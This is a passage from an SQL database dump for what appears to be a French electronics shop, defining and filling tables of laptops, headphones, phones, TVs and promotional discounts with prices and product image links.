(75, 'AR202601060034', 'Altyk L16F-I5P32-N2', 'Intel Core i5-1240P 32 Go SSD 1920 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 Famille', 849.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/38/LD0006253825_0006255073_0006310914.jpg'),
(74, 'AR202601060030', 'Altyk L16F-I5P16-N1', 'Intel Core i5-1240P 16 Go SSD 960 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 Famille', 699.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/37/LD0006253792_0006310895.jpg'),
(73, 'AR202511270118', 'Altyk L16F-I3P16-N05', 'Intel Core i3-1220P 16 Go SSD 480 Go 16\" LED Full HD+ Wi-Fi 6E Webcam Windows 11 Famille', 549.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/37/LD0006253703_0006302366.jpg'),
(72, 'AR202501020056', 'Altyk L14P-I5U16-N1', 'Intel Core i5-1235U 16 Go SSD 960 Go 14\" LED Full HD Wi-Fi 6 Webcam Windows 11 Professionnel', 749.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/05/99/LD0006059907_0006060410_0006172696_0006249236_0006265440.jpg'),
(71, 'AR202501020057', 'Altyk L14F-I7U16-N1', 'Intel Core i7-1255U 16 Go SSD 960 Go 14\" LED Full HD Wi-Fi 6 Webcam Windows 11 Famille', 799.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/05/99/LD0006059907_0006060436_0006187870_0006307047.jpg'),
(70, 'AR202501020055', 'Altyk L14F-I5U16-N1', 'Intel Core i5-1235U 16 Go SSD 960 Go 14\" LED Full HD Wi-Fi 6 Webcam Windows 11 Famille', 649.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/05/99/LD0006059907_0006060436_0006060452_0006170808_0006248583_0006258635.jpg'),
(69, 'AR202505200011', 'Altyk L14F-I5U16-N1', 'Intel Core i5-1235U 16 Go SSD 960 Go 14\" LED Full HD Wi-Fi 6 Webcam Windows 11 Famille', 649.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/05/99/LD0006059907_0006060436_0006060452_0006170808_0006248583.jpg'),
(105, 'AR202412200130', 'ASUS ExpertBook B1 B1503CVA-S71361X', 'Intel Core i7-13620H 32 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1149.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/20/08/LD0006200814_0006200841_0006200867.jpg'),
(106, 'AR202506160123', 'ASUS ExpertBook B1 B1503CVA-S74764X', 'Intel Core 5 120U 16 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6/Bluetooth Windows 11 Professionnel', 899.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/22/58/LD0006225802_0006225941_0006268682.jpg'),
(107, 'AR202512150057', 'ASUS ExpertBook B3 B3405CVA-LY0299X', 'Intel Core i7-13620H 16 Go SSD 512 Go 14\" LED Full HD+ Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1129.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/58/LD0006305894.jpg'),
(108, 'AR202512150056', 'ASUS ExpertBook B3 B3605CVA-MB0196X', 'Intel Core i5-13420H 16 Go SSD 512 Go 16\" LED Full HD+ Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1049.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/55/LD0006305569_0006305711.jpg'),
(109, 'AR202512160179', 'ASUS ExpertBook B3 B3605CVA-MB0197X', 'Intel Core i7-13620H 16 Go SSD 512 Go 16\" LED Full HD+ Wi-Fi 6/Bluetooth Windows 11 Professionnel', 1199.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/55/LD0006305569.jpg'),
(110, 'AR202512160180', 'ASUS ExpertBook B3 B5605CCA-PL0017X', 'Intel Core Ultra 5 225H 16 Go SSD 512 Go 16\" LED QHD+ Wi-Fi 7/Bluetooth Windows 11 Professionnel', 1399.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/30/55/LD0006305569_0006305601.jpg'),
(111, 'AR202407030085', 'ASUS ExpertBook B3 Flip B3402FVA-EC0164X', 'Intel Core i5-1335U 16 Go SSD 512 Go 14\" LED Tactile Full HD Wi-Fi 6 Windows 11 Professionnel', 1149.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/25/36/LD0006253602.jpg'),
(112, 'AR202401030078', 'ASUS ExpertBook B5 B5404CMA-Q70062X', 'Intel Core Ultra 7 155U 16 Go SSD 512 Go 14\" LED Full HD+ Wi-Fi 6E Windows 11 Professionnel', 1499.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/13/48/LD0006134844_0006134941.jpg'),
(113, 'AR202511180088', 'ASUS ExpertBook B5 B5405CCA-NZ0030X', 'Intel Core Ultra 5 225H 16 Go SSD 512 Go 14\" LED QHD+ Wi-Fi 7 Windows 11 Professionnel', 1549.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/29/87/LD0006298713.jpg'),
(114, 'AR202506160124', 'ASUS ExpertBook B9 OLED B9403CVAR-PP1629X', 'Intel Core 7-150U 32 Go SSD 1 To 14\" OLED 2.8K Wi-Fi 6E Windows 11 Professionnel', 2399.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/04/67/LD0006046731_0006140092_0006256232.jpg'),
(115, 'AR202509240056', 'ASUS ExpertBook BM1 BM1503CDA-S70021X', 'AMD Ryzen 5 7535U 16 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6 Windows 11 Professionnel', 799.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/28/17/LD0006281794_0006281879.jpg'),
(116, 'AR202509250010', 'ASUS ExpertBook BM1 BM1503CDA-S70310X', 'AMD Ryzen 7 7735U 16 Go SSD 512 Go 15.6\" LED Full HD Wi-Fi 6 Windows 11 Professionnel', 899.00, 'Ordinateur Portable', 'https://media.ldlc.com/r150/ld/products/00/06/28/17/LD0006281794.jpg');

-- --------------------------------------------------------

--
-- Structure de la table `promos`
--

DROP TABLE IF EXISTS `promos`;
CREATE TABLE IF NOT EXISTS `promos` (
  `id_promo` int NOT NULL AUTO_INCREMENT,
  `id_produit_ref` int NOT NULL,
  `table_origine` varchar(50) NOT NULL,
  `pourcentage` int NOT NULL,
  `date_debut` datetime DEFAULT CURRENT_TIMESTAMP,
  `date_fin` datetime DEFAULT NULL,
  `statut` tinyint(1) DEFAULT '1',
  PRIMARY KEY (`id_promo`),
  UNIQUE KEY `unique_promo_produit` (`id_produit_ref`,`table_origine`),
  KEY `id_produit_ref` (`id_produit_ref`,`table_origine`)
) ENGINE=InnoDB AUTO_INCREMENT=74 DEFAULT CHARSET=utf8mb3;

--
-- Déchargement des données de la table `promos`
--

INSERT INTO `promos` (`id_promo`, `id_produit_ref`, `table_origine`, `pourcentage`, `date_debut`, `date_fin`, `statut`) VALUES
(2, 12, 'telephone', 10, '2026-03-13 21:19:07', NULL, 1),
(3, 3, 'televisions', 30, '2026-03-13 21:19:07', NULL, 1),
(4, 116, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(5, 115, 'produit', 10, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(6, 114, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(7, 113, 'produit', 30, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(8, 112, 'produit', 5, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(9, 111, 'produit', 25, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(10, 110, 'produit', 40, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(11, 109, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(12, 108, 'produit', 10, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(13, 107, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(14, 106, 'produit', 50, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(15, 105, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(16, 104, 'produit', 12, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(17, 103, 'produit', 8, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(18, 102, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(19, 101, 'produit', 35, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(20, 100, 'produit', 10, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(21, 99, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(22, 98, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(23, 97, 'produit', 25, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(24, 96, 'produit', 30, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(25, 95, 'produit', 10, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(26, 94, 'produit', 5, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(27, 93, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(28, 92, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(29, 91, 'produit', 10, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(30, 90, 'produit', 40, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(31, 89, 'produit', 20, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(32, 88, 'produit', 15, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(33, 87, 'produit', 50, '2026-03-13 21:33:48', '2026-12-31 23:59:59', 1),
(34, 117, 'televisions', 15, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(35, 118, 'televisions', 10, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(36, 120, 'televisions', 20, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(37, 123, 'televisions', 25, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(38, 125, 'televisions', 30, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(39, 128, 'televisions', 15, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(40, 131, 'televisions', 40, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(41, 133, 'televisions', 20, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(42, 136, 'televisions', 10, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(43, 139, 'televisions', 15, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(44, 142, 'televisions', 25, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(45, 145, 'televisions', 35, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(46, 148, 'televisions', 10, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(47, 152, 'televisions', 20, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(48, 155, 'televisions', 15, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(49, 157, 'televisions', 12, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(50, 158, 'televisions', 30, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(51, 160, 'televisions', 20, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(52, 162, 'televisions', 25, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(53, 164, 'televisions', 10, '2026-03-13 21:44:10', '2026-12-31 23:59:59', 1),
(54, 117, 'telephone', 25, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(55, 118, 'telephone', 20, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(56, 120, 'telephone', 30, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(57, 121, 'telephone', 15, '2026-03-13 21:50:14', '2026-03-16 23:00:00', 1),
(58, 123, 'telephone', 15, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(59, 125, 'telephone', 18, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(60, 128, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(61, 129, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(62, 132, 'telephone', 12, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(63, 134, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(64, 137, 'telephone', 15, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(65, 138, 'telephone', 5, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(66, 140, 'telephone', 5, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(67, 142, 'telephone', 8, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(68, 144, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(69, 146, 'telephone', 5, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(70, 147, 'telephone', 12, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(71, 149, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(72, 150, 'telephone', 15, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1),
(73, 151, 'telephone', 10, '2026-03-13 21:50:14', '2026-12-31 23:59:59', 1);

-- --------------------------------------------------------

--
-- Structure de la table `sons`
--

DROP TABLE IF EXISTS `sons`;
CREATE TABLE IF NOT EXISTS `sons` (
  `id_produit` int NOT NULL AUTO_INCREMENT,
  `id_externe` varchar(100) DEFAULT NULL,
  `nom` text NOT NULL,
  `description` text,
  `prix` decimal(10,2) DEFAULT NULL,
  `categories` text NOT NULL,
  `image` text,
  PRIMARY KEY (`id_produit`),
  UNIQUE KEY `id_externe` (`id_externe`)
) ENGINE=MyISAM AUTO_INCREMENT=127 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `sons`
--

INSERT INTO `sons` (`id_produit`, `id_externe`, `nom`, `description`, `prix`, `categories`, `image`) VALUES
(117, 'AR201803290201', 'AKG K240 MKII', 'Casque circum-aural semi-ouvert Hi-Fi / Monitoring avec diaphragme double couche', 89.90, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/86/06/LD0004860670_2.jpg'),
(118, 'AR201803290202', 'AKG K240 Studio', 'Casque circum-aural semi-ouvert Hi-Fi / Mixage avec diaphragme double couche', 75.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/86/05/LD0004860528_2.jpg'),
(119, 'AR202001130052', 'AKG K361-BT', 'Casque circum-aural fermé sans fil - Hi-Fi / Monitoring / Streaming - Bluetooth 5.0', 129.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/05/57/07/LD0005570745_2.jpg'),
(120, 'AR201803290205', 'AKG K52', 'Casque circum-aural fermé Hi-Fi / Monitoring', 39.90, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/85/12/LD0004851268_2.jpg'),
(121, 'AR201803300010', 'AKG K712 PRO', 'Casque circum-aural ouvert Hi-Fi / Monitoring avec bobinage à plat', 249.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/04/85/99/LD0004859932_2.jpg'),
(122, 'AR202409100108', 'Apple AirPods 4', 'Écouteurs intra-auriculaires True Wireless - Bluetooth - Autonomie 5 + 25 h', 149.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/16/66/LD0006166698.jpg'),
(123, 'AR202409100111', 'Apple AirPods Max Minuit', 'Casque circum-aural fermé sans fil - Réduction de bruit active - Bluetooth 5.0', 579.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/16/68/LD0006166837.jpg'),
(124, 'AR202309130355', 'Apple AirPods Pro 2 (USB-C)', 'Réduction active du bruit et mode Transparence - Audio adaptatif - Bluetooth 5.3', 279.00, 'Audio', 'https://media.ldlc.com/r150/ld/products/00/06/06/66/LD0006066681.jpg'),
(125, 'MK241113528912', 'Avizar Conduction Osseuse', 'Transmission fluide et sans interférence - Bluetooth 5.2 - Modèle Stan Noir', 45.00, 'Audio', 'https://media.ldlc.com/r150/mktp/product/productImage/241113/105/671a678b566f48de8709742d6ba2850f.webp'),
(126, 'MK250610604716', 'Avizar Portland Noir', 'Casque Stéréo Bluetooth 5.3 Portland avec Micro Jack 3.5mm - 12h autonomie', 29.90, 'Audio', 'https://media.ldlc.com/r150/mktp/product/productImage/250610/120/5b318e991a84452c9b0f5856eef0f5ae.webp');

-- --------------------------------------------------------

--
-- Structure de la table `telephone`
--

DROP TABLE IF EXISTS `telephone`;
CREATE TABLE IF NOT EXISTS `telephone` (
  `id_produit` int NOT NULL AUTO_INCREMENT,
  `id_externe` varchar(100) DEFAULT NULL,
  `nom` text NOT NULL,
  `description` text,
  `prix` decimal(10,2) DEFAULT NULL,
  `categories` text NOT NULL,
  `image` text,
  PRIMARY KEY (`id_produit`),
  UNIQUE KEY `id_externe` (`id_externe`)
) ENGINE=MyISAM AUTO_INCREMENT=152 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `telephone`
--

INSERT INTO `telephone` (`id_produit`, `id_externe`, `nom`, `description`, `prix`, `categories`, `image`) VALUES
(117, 'AR202209080109', 'Apple iPhone 14 512 Go (PRODUCT)RED', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A15 Bionic - Ecran 6.1\" - 512 Go - iOS 16', 929.00, '', 'https://media.ldlc.com/r150/ld/products/00/05/97/72/LD0005977210_0005977244_0005977280.jpg'),
(118, 'AR202209080113', 'Apple iPhone 14 512 Go Lumière Stellaire', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A15 Bionic - Ecran 6.1\" - 512 Go - iOS 16', 929.00, '', 'https://media.ldlc.com/r150/ld/products/00/05/97/72/LD0005977239_0005977274_0005977313.jpg'),
(119, 'AR202209080131', 'Apple iPhone 14 Plus 512 Go Bleu', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A15 Bionic - Ecran 6.7\" - 512 Go - iOS 16', 1029.00, '', 'https://media.ldlc.com/r150/ld/products/00/05/97/73/LD0005977353_0005977388_0005977442.jpg'),
(120, 'AR202209080154', 'Apple iPhone 14 Pro 1 To Or', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 1 To - iOS 16', 1249.00, '', 'https://media.ldlc.com/r150/ld/products/00/05/97/75/LD0005977510_0005977530_0005977559_0005977597.jpg'),
(121, 'AR202309130018', 'Apple iPhone 15 128 Go Noir', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 128 Go - iOS 17', 769.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/39/LD0006063994.jpg'),
(122, 'AR202309130019', 'Apple iPhone 15 128 Go Rose', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 128 Go - iOS 17', 769.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/40/LD0006064004.jpg'),
(123, 'AR202309130025', 'Apple iPhone 15 256 Go Jaune', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 256 Go - iOS 17', 899.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/40/LD0006064009_0006064034.jpg'),
(124, 'AR202309130030', 'Apple iPhone 15 512 Go Jaune', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 512 Go - iOS 17', 1099.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/40/LD0006064009_0006064034_0006064059.jpg'),
(125, 'AR202309130029', 'Apple iPhone 15 512 Go Rose', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 512 Go - iOS 17', 1099.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/40/LD0006064004_0006064029_0006064054.jpg'),
(126, 'AR202309130032', 'Apple iPhone 15 512 Go Vert', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.1\" - 512 Go - iOS 17', 1099.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/40/LD0006064019_0006064044_0006064069.jpg'),
(127, 'AR202309130045', 'Apple iPhone 15 Plus 512 Go Jaune', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A16 Bionic - Ecran 6.7\" - 512 Go - iOS 17', 1199.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/06/41/LD0006064134_0006064159_0006064188.jpg'),
(128, 'AR202409100035', 'Apple iPhone 16 128 Go Blanc', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 128 Go - iOS 18', 969.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166728_0006166758_0006166783.jpg'),
(129, 'AR202409100034', 'Apple iPhone 16 128 Go Noir', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 128 Go - iOS 18', 969.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166733_0006166763_0006166788.jpg'),
(130, 'AR202409100037', 'Apple iPhone 16 128 Go Outremer', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 128 Go - iOS 18', 969.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166713_0006166744_0006166773.jpg'),
(131, 'AR202409100038', 'Apple iPhone 16 128 Go Sarcelle', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 128 Go - iOS 18', 969.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166708_0006166738_0006166768.jpg'),
(132, 'AR202409100046', 'Apple iPhone 16 512 Go Blanc', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 512 Go - iOS 18', 1219.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166728.jpg'),
(133, 'AR202409100047', 'Apple iPhone 16 512 Go Rose', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 512 Go - iOS 18', 1219.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166719.jpg'),
(134, 'AR202409100053', 'Apple iPhone 16 Plus 128 Go Outremer', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.7\" - 128 Go - iOS 18', 1119.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/66/LD0006166628_0006166653_0006166678.jpg'),
(135, 'AR202409100054', 'Apple iPhone 16 Plus 128 Go Sarcelle', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.7\" - 128 Go - iOS 18', 1119.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/66/LD0006166618_0006166648_0006166673.jpg'),
(136, 'AR202409100061', 'Apple iPhone 16 Plus 512 Go Blanc', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.7\" - 512 Go - iOS 18', 1369.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/66/LD0006166638.jpg'),
(137, 'AR202502200006', 'Apple iPhone 16e 512 Go Noir', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 512 Go - iOS 18', 1049.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/21/57/LD0006215747_0006215759_0006215772.jpg'),
(138, 'AR202509100051', 'Apple iPhone 17 256 Go Brume', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 - Ecran 6.3\" - 256 Go - iOS 26', 1129.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275124.jpg'),
(139, 'AR202509100053', 'Apple iPhone 17 256 Go Sauge', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 - Ecran 6.3\" - 256 Go - iOS 26', 1129.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275149.jpg'),
(140, 'AR202509100056', 'Apple iPhone 17 512 Go Brume', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 - Ecran 6.3\" - 512 Go - iOS 26', 1329.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275124_0006275165.jpg'),
(141, 'AR202509100058', 'Apple iPhone 17 512 Go Sauge', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 - Ecran 6.3\" - 512 Go - iOS 26', 1329.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275149_0006275175.jpg'),
(142, 'AR202509100071', 'Apple iPhone 17 Pro 256 Go Argent', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 Pro - Ecran 6.3\" - 256 Go - iOS 26', 1429.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275193.jpg'),
(143, 'AR202509100073', 'Apple iPhone 17 Pro 256 Go Bleu Intense', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 Pro - Ecran 6.3\" - 256 Go - iOS 26', 1429.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/52/LD0006275203.jpg'),
(144, 'AR202509100072', 'Apple iPhone 17 Pro 256 Go Orange Cosmique', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 Pro - Ecran 6.3\" - 256 Go - iOS 26', 1429.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275198.jpg'),
(145, 'AR202509100075', 'Apple iPhone 17 Pro 512 Go Orange Cosmique', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 Pro - Ecran 6.3\" - 512 Go - iOS 26', 1629.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275198_0006275213.jpg'),
(146, 'AR202509100082', 'Apple iPhone 17 Pro Max 256 Go Bleu Intense', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A19 Pro - Ecran 6.9\" - 256 Go - iOS 26', 1579.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/53/LD0006275321.jpg'),
(147, 'AR202509100068', 'Apple iPhone Air 1 To Blanc nuage', 'Smartphone 5G-LTE IP68 Dual eSIM - Apple A19 Pro - Ecran 6.5\" - 1 To - iOS 26', 1899.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/50/LD0006275069_0006275074_0006275082.jpg'),
(148, 'AR202509100070', 'Apple iPhone Air 1 To Bleu ciel', 'Smartphone 5G-LTE IP68 Dual eSIM - Apple A19 Pro - Ecran 6.5\" - 1 To - iOS 26', 1899.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/51/LD0006275119_0006275144.jpg'),
(149, 'AR202509100069', 'Apple iPhone Air 1 To Or clair', 'Smartphone 5G-LTE IP68 Dual eSIM - Apple A19 Pro - Ecran 6.5\" - 1 To - iOS 26', 1899.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/50/LD0006275089_0006275094_0006275109.jpg'),
(150, 'AR202509100060', 'Apple iPhone Air 256 Go Blanc nuage', 'Smartphone 5G-LTE IP68 Dual eSIM - Apple A19 Pro - Ecran 6.5\" - 256 Go - iOS 26', 1499.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/27/50/LD0006275069.jpg'),
(151, 'AR202409100036', 'Apple iPhone 16 128 Go Rose', 'Smartphone 5G-LTE IP68 Dual SIM - Apple A18 - Ecran 6.1\" - 128 Go - iOS 18', 969.00, '', 'https://media.ldlc.com/r150/ld/products/00/06/16/67/LD0006166719_0006166753_0006166778.jpg');

-- --------------------------------------------------------

--
-- Structure de la table `televisions`
--

DROP TABLE IF EXISTS `televisions`;
CREATE TABLE IF NOT EXISTS `televisions` (
  `id_produit` int NOT NULL AUTO_INCREMENT,
  `id_externe` varchar(100) DEFAULT NULL,
  `nom` text NOT NULL,
  `description` text,
  `prix` decimal(10,2) DEFAULT NULL,
  `categories` text NOT NULL,
  `image` text,
  PRIMARY KEY (`id_produit`),
  UNIQUE KEY `id_externe` (`id_externe`)
) ENGINE=MyISAM AUTO_INCREMENT=165 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Déchargement des données de la table `televisions`
--

INSERT INTO `televisions` (`id_produit`, `id_externe`, `nom`, `description`, `prix`, `categories`, `image`) VALUES
(117, 'AR202412180054', 'ASUS 27\" LED - ZenScreen MS27UC', 'Ecran PC 4K - 3840 x 2160 pixels - 5 ms - Dalle IPS - HDR 400 - Wi-Fi/Bluetooth', 449.90, 'TV/Moniteur', 'https://media.ldlc.com/r150/ld/products/00/06/19/83/LD0006198332.jpg'),
(118, 'AR202508130027', 'Hisense 40A4Q', 'Téléviseur LED Full HD 40\" (101 cm) 16/9 - Wi-Fi - 2x HDMI - Son 2.0 12W', 299.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/35/LD0006273579.jpg'),
(119, 'AR202508130028', 'Hisense 43A6Q', 'Téléviseur LED 4K UHD 43\" (108 cm) 16/9 - Dolby Vision/HDR10+ - 3x HDMI 2.1', 349.00, 'TV', 'https://media.ldlc.com/r150/ld/products/00/06/27/25/LD0006272525_0006273528.jpg'),
